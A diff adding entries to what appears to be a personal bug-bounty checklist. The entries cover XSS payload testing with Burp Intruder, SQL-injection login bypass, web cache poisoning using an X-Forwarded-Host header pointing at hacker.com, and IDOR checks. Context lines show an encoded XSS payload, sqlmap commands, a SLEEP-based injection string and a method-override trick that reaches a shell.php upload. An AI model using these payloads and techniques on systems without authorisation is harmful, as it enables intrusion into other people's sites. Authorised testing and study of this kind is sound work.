@@ -680,6 +680,8 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 	<ScRiPt >confirm(1)</ScRiPt> [❌Blocked]
 	
 	PFNjUmlQdCA+Y29uZmlybSgxKTwvU2NSaVB0Pg==
+16- using intruder search for xss payloads and put them into intruder and try to open every link and see
+
 ------------------------------------------------------------------------------------------------------------
 Blind XSS 
 1- site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" |
@@ -1056,7 +1058,9 @@ batch --random-agent --level 1 | tee sqlmap.txt
 10- Parameter=randomtext%' OR SLEEP (5) #
 
 11- sqlmap -r request.txt --ignore-code 401
-
+12- search for sqli payloads and put them into intruder => 	Bypass login panel with common login SQL injection payloads using Burpsuite intruder.
+13- check if http not https => clear text transmittion
+14- 
 
 ------------------------------------------------------------------------------------------------------
 Blind Sqli
@@ -1233,6 +1237,19 @@ Burpsuite
 	Request header		Origin: null
 Response body => isAdmin: false => isAdmin: true
 
+
+------------------------------------------------------------------------------------------------
+X-Cache header in response if HIT then can use web cache poison
+cache 
+put 
+X-Forwarded-Scheme: nohttps
+X-Forwarded-Host: hacker.com
+......
+When see vary in response means that the specific header in request varies the cache
+vary: User-Agent
+dig the request to know hidden headers lead to cache posining attack
+can put 
+Pragma: x-get-cache-key	==> to display cache key in response
 
 --------------------------------------------------------------------------------------------------
 JWT
@@ -1447,6 +1464,12 @@ IDOR
 {“id”:{“id”:111}} --> 200 OK
 PUT /shell.php ==> 403 
 GET /shell.php -H "X-Method-Override: PUT" ==> 200
+
+13- Delete profile photo and intercept , change the id and see if the other account photo has been deleted
+14- try logout and change id and see if the other account has been out or not
+
+
+
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Jira
